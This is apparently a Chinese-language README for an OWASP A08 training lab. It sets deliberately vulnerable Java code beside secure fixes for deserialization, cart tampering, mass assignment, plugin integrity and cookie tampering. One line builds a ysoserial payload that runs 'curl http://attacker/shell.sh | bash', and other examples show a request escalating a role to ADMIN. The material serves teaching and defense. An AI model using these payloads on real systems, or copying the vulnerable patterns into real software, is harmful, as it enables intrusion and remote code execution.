# A08:2021 - Software and Data Integrity Failures

## 📋 概述

此模組展示 OWASP Top 10 2021 中的 **A08: 軟體與資料完整性失敗** 漏洞類別。

### 涵蓋的 CWE
- **CWE-502**: Deserialization of Untrusted Data（不安全的反序列化）
- **CWE-345**: Insufficient Verification of Data Authenticity（資料真實性驗證不足）
- **CWE-353**: Missing Support for Integrity Check（缺少完整性檢查支援）
- **CWE-915**: Improperly Controlled Modification of Dynamically-Determined Object Attributes（Mass Assignment）
- **CWE-494**: Download of Code Without Integrity Check（下載程式碼未進行完整性檢查）
- **CWE-565**: Reliance on Cookies without Validation or Integrity Checking（依賴未驗證的 Cookie）

## 🔥 漏洞演示

### 1. 不安全的反序列化 (Insecure Deserialization)

**攻擊原理：**
Java 的 `ObjectInputStream.readObject()` 會在反序列化時執行物件的特殊方法。如果 classpath 中存在可利用的 "gadget chain"（如 commons-collections4），攻擊者可以透過精心構造的序列化資料執行任意程式碼。

**漏洞程式碼：**
```java
// ⚠️ 漏洞：直接反序列化不受信任的資料
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();  // 可能觸發 RCE！
```

**安全程式碼：**
```java
// ✅ 安全：使用 ObjectInputFilter 白名單
ois.setObjectInputFilter(filterInfo -> {
    Class<?> clazz = filterInfo.serialClass();
    if (ALLOWED_CLASSES.contains(clazz.getName())) {
        return ObjectInputFilter.Status.ALLOWED;
    }
    return ObjectInputFilter.Status.REJECTED;
});
```

**攻擊腳本：**
```bash
# 使用 ysoserial 產生惡意 payload
java -jar ysoserial-all.jar CommonsCollections4 "curl http://attacker/shell.sh | bash" > payload.bin

# 發送攻擊
python deserialization_exploit.py vulnerable
```

### 2. 購物車資料竄改 (Cart Data Tampering)

**攻擊原理：**
漏洞版本直接信任客戶端傳來的購物車資料（包括價格），攻擊者可以修改價格資訊，以極低價格購買商品。

**漏洞程式碼：**
```java
// ⚠️ 漏洞：直接使用客戶端提供的價格
BigDecimal price = new BigDecimal(item.get("price").toString());
```

**安全程式碼：**
```java
// ✅ 安全：驗證 HMAC 簽名
String expectedSignature = calculateHmac(cartJson);
if (!MessageDigest.isEqual(signature.getBytes(), expectedSignature.getBytes())) {
    throw new SecurityException("Cart data tampered!");
}

// ✅ 從伺服器端查詢真實價格
BigDecimal serverPrice = getProductPriceFromServer(productId);
```

**攻擊腳本：**
```bash
python cart_tampering.py vulnerable

# 攻擊範例輸出：
# 原價: $1499.97
# 付款: $0.03
# 省下: $1499.94
```

### 3. Mass Assignment 攻擊

**攻擊原理：**
使用 `BeanUtils.copyProperties` 或反射複製所有欄位時，攻擊者可以傳入不應該被修改的欄位（如 `role`、`balance`）來提權或竄改資料。

**漏洞程式碼：**
```java
// ⚠️ 漏洞：複製所有欄位
BeanUtils.copyProperties(userDTO, user);

// 或使用反射
profileData.forEach((key, value) -> {
    Field field = User.class.getDeclaredField(key);
    field.set(user, value);  // 攻擊者可設定 role=ADMIN！
});
```

**安全程式碼：**
```java
// ✅ 安全：使用明確的 DTO 白名單
public class ProfileUpdateRequest {
    private String email;      // 允許
    private String fullName;   // 允許
    private String phone;      // 允許
    // 沒有 role, balance, enabled 等敏感欄位！
}
```

**攻擊腳本：**
```bash
python mass_assignment.py vulnerable

# 攻擊請求：
# {"email": "hacker@evil.com", "role": "ADMIN", "balance": 999999}
```

### 4. 插件完整性繞過 (Plugin Integrity Bypass)

**攻擊原理：**
安裝插件時不驗證 SHA256 hash，攻擊者可以透過 DNS 污染、中間人攻擊等方式替換成惡意插件。

**漏洞程式碼：**
```java
// ⚠️ 漏洞：不驗證 hash 直接安裝
Plugin plugin = Plugin.builder()
    .name(pluginName)
    .downloadUrl(downloadUrl)
    .sha256Hash(null)  // 不驗證！
    .verified(false)
    .build();
pluginRepository.save(plugin);
```

**安全程式碼：**
```java
// ✅ 安全：驗證 SHA256 hash
String actualHash = calculateHash(downloadedFile);
if (!expectedHash.equalsIgnoreCase(actualHash)) {
    throw new SecurityException("Plugin integrity verification failed!");
}
```

**攻擊腳本：**
```bash
python plugin_injection.py supply-chain
```

### 5. Session Cookie 竄改

**攻擊原理：**
使用未簽名的 Base64 Cookie 儲存會話資料，攻擊者可以直接解碼、修改、再編碼來提權。

**漏洞程式碼：**
```java
// ⚠️ 漏洞：未簽名的 Cookie
String encodedSession = Base64.getEncoder().encodeToString(sessionJson.getBytes());
Cookie sessionCookie = new Cookie("user_session", encodedSession);
```

**安全程式碼：**
```java
// ✅ 安全：使用 JWT 簽名
String jwt = Jwts.builder()
    .claims(sessionData)
    .signWith(secretKey)
    .compact();
Cookie sessionCookie = new Cookie("user_session", jwt);
```

**攻擊腳本：**
```bash
python session_tampering.py vulnerable

# 攻擊步驟：
# 1. Base64 解碼 Cookie
# 2. 將 "role": "user" 改為 "role": "admin"
# 3. Base64 編碼
# 4. 使用竄改的 Cookie 執行管理員操作
```

## 🛡️ 防禦措施

### 1. 反序列化防護
```java
// 1. 使用 ObjectInputFilter（Java 9+）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.lang.*;java.util.*;!*"
);

// 2. 避免使用 Java 原生序列化，改用 JSON
ObjectMapper mapper = new ObjectMapper();
MyClass obj = mapper.readValue(json, MyClass.class);

// 3. 使用 RASP（Runtime Application Self-Protection）
```

### 2. 資料完整性保護
```java
// 使用 HMAC-SHA256 簽名
Mac mac = Mac.getInstance("HmacSHA256");
SecretKeySpec keySpec = new SecretKeySpec(secret.getBytes(), "HmacSHA256");
mac.init(keySpec);
byte[] signature = mac.doFinal(data.getBytes());
```

### 3. Mass Assignment 防護
```java
// 1. 使用明確的 DTO
public class UserUpdateDTO {
    @JsonProperty("email")
    private String email;
    // 只包含允許更新的欄位
}

// 2. 使用 @JsonIgnoreProperties
@JsonIgnoreProperties(ignoreUnknown = true)
public class UserDTO { ... }

// 3. 使用 Spring Data REST 的 @RepositoryRestResource 設定
```

### 4. 軟體完整性驗證
```java
// 驗證 SHA256 hash
MessageDigest digest = MessageDigest.getInstance("SHA-256");
byte[] hash = digest.digest(fileBytes);
if (!Arrays.equals(hash, expectedHash)) {
    throw new SecurityException("File integrity check failed!");
}

// 或使用 GPG 簽名驗證
```

### 5. Cookie/Session 保護
```java
// 使用 JWT 簽名
String jwt = Jwts.builder()
    .claims(claims)
    .issuedAt(new Date())
    .expiration(new Date(System.currentTimeMillis() + 3600000))
    .signWith(Keys.hmacShaKeyFor(secret.getBytes()))
    .compact();

// Cookie 屬性
cookie.setHttpOnly(true);   // 防止 XSS 存取
cookie.setSecure(true);     // 只透過 HTTPS 傳送
cookie.setSameSite("Strict"); // 防止 CSRF
```

## 📊 測試 API

### 漏洞版本端點 (Port 8081)

| 方法 | 端點 | 描述 |
|------|------|------|
| POST | `/api/integrity/deserialize` | 不安全的反序列化 |
| POST | `/api/integrity/deserialize/base64` | Base64 編碼的反序列化 |
| POST | `/api/integrity/cart/checkout` | 無簽名驗證的結帳 |
| POST | `/api/integrity/cart/save` | 儲存購物車（無簽名） |
| PUT | `/api/integrity/profile/{userId}` | Mass Assignment 漏洞 |
| POST | `/api/integrity/profile/update` | BeanUtils Mass Assignment |
| POST | `/api/integrity/plugins/install` | 無驗證的插件安裝 |
| GET | `/api/integrity/plugins` | 列出插件 |
| POST | `/api/integrity/session/create` | 建立未簽名 Session |
| GET | `/api/integrity/session/validate` | 驗證 Session |
| POST | `/api/integrity/session/admin-action` | 管理員操作 |
| GET | `/api/integrity/logs/deserialization` | 反序列化日誌 |

### 安全版本端點 (Port 8082)

相同端點，但實作了完整的安全防護措施。

## 🧪 執行測試

```bash
# 進入 attacker 容器
docker exec -it attacker /bin/sh

# 安裝依賴
pip install -r /app/scripts/a08/requirements.txt

# 執行各種攻擊腳本
cd /app/scripts/a08

# 反序列化攻擊
python deserialization_exploit.py both

# 購物車竄改
python cart_tampering.py both

# Mass Assignment
python mass_assignment.py both

# 插件注入
python plugin_injection.py both

# Session 竄改
python session_tampering.py both
```

## 🔗 相關資源

- [OWASP A08:2021](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [ysoserial - Java Deserialization Payloads](https://github.com/frohoff/ysoserial)
- [Java ObjectInputFilter](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html)
- [HMAC Wikipedia](https://en.wikipedia.org/wiki/HMAC)
- [JWT.io](https://jwt.io/)

## ⚠️ 警告

這些攻擊腳本僅供教育目的。請勿在未經授權的系統上使用這些技術。
